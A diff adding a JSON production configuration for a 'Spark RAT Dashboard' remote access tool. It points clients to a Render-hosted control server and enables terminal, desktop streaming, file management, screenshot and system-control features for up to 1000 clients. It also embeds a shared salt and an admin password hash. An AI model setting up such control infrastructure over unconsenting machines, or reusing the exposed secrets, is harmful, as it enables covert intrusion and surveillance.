@@ -1,0 +1,112 @@
+{
+  "environment": "production",
+  "version": "2.0.0",
+  "deployment": {
+    "backend": {
+      "platform": "Render",
+      "url": "https://spark-backend-fixed-v2.onrender.com",
+      "region": "oregon",
+      "plan": "starter",
+      "auto_deploy": true,
+      "health_check": "/api/info"
+    },
+    "frontend": {
+      "platform": "Vercel",
+      "url": "https://spark-rat-dashboard.vercel.app",
+      "region": "global",
+      "auto_deploy": true,
+      "build_command": "npm run vercel-build",
+      "output_directory": "dist"
+    }
+  },
+  "environment_variables": {
+    "backend": {
+      "PORT": "8000",
+      "GO_ENV": "production",
+      "SPARK_SALT": "a2dac101827c8d47f00831f2d6c078b2",
+      "SPARK_ADMIN_HASH": "$2b$10$RYCAuSMeNE1uh2/qka5PSeE6RFjynbpXu95HMStXmUHA8qaQNBFjG"
+    },
+    "frontend": {
+      "REACT_APP_API_URL": "https://spark-backend-fixed-v2.onrender.com",
+      "REACT_APP_WS_URL": "wss://spark-backend-fixed-v2.onrender.com",
+      "REACT_APP_NAME": "Spark RAT Dashboard",
+      "REACT_APP_VERSION": "2.0.0",
+      "REACT_APP_ENVIRONMENT": "production",
+      "REACT_APP_ENABLE_HTTPS": "true",
+      "REACT_APP_ENABLE_WEBSOCKETS": "true",
+      "REACT_APP_ENABLE_TERMINAL": "true",
+      "REACT_APP_ENABLE_DESKTOP": "true",
+      "REACT_APP_ENABLE_FILE_MANAGER": "true",
+      "REACT_APP_ENABLE_PROCESS_MANAGER": "true",
+      "REACT_APP_ENABLE_SCREENSHOT": "true",
+      "REACT_APP_ENABLE_SYSTEM_CONTROL": "true"
+    }
+  },
+  "security": {
+    "backend": {
+      "https_enforced": true,
+      "cors_origins": ["https://spark-rat-dashboard.vercel.app"],
+      "rate_limiting": {
+        "enabled": true,
+        "max_requests_per_minute": 60
+      },
+      "headers": {
+        "HSTS": "max-age=31536000; includeSubDomains",
+        "X-Frame-Options": "DENY",
+        "X-Content-Type-Options": "nosniff",
+        "X-XSS-Protection": "1; mode=block"
+      }
+    },
+    "frontend": {
+      "https_enforced": true,
+      "security_headers": {
+        "X-Content-Type-Options": "nosniff",
+        "X-Frame-Options": "DENY",
+        "X-XSS-Protection": "1; mode=block",
+        "Referrer-Policy": "strict-origin-when-cross-origin"
+      },
+      "csp": "default-src 'self'; script-src 'self' 'unsafe-inline'; style-src 'self' 'unsafe-inline'"
+    }
+  },
+  "monitoring": {
+    "backend": {
+      "health_endpoint": "/api/info",
+      "metrics_endpoint": "/api/metrics",
+      "log_level": "info",
+      "retention_days": 7
+    },
+    "frontend": {
+      "error_boundary": true,
+      "performance_monitoring": true,
+      "analytics": false
+    }
+  },
+  "client_configuration": {
+    "server_host": "spark-backend-fixed-v2.onrender.com",
+    "server_port": 443,
+    "secure_connection": true,
+    "salt": "a2dac101827c8d47f00831f2d6c078b2",
+    "auto_reconnect": true,
+    "reconnect_interval": 5000
+  },
+  "features": {
+    "terminal": true,
+    "desktop_streaming": true,
+    "file_manager": true,
+    "process_manager": true,
+    "screenshot": true,
+    "system_control": true,
+    "real_time_monitoring": true
+  },
+  "scalability": {
+    "max_clients": 1000,
+    "connection_timeout": 300,
+    "buffer_size": 65535,
+    "auto_scaling": true
+  },
+  "backup": {
+    "device_registry": "in_memory_with_disk_persistence",
+    "logs": "render_disk_storage",
+    "configuration": "environment_variables"
+  }
+}
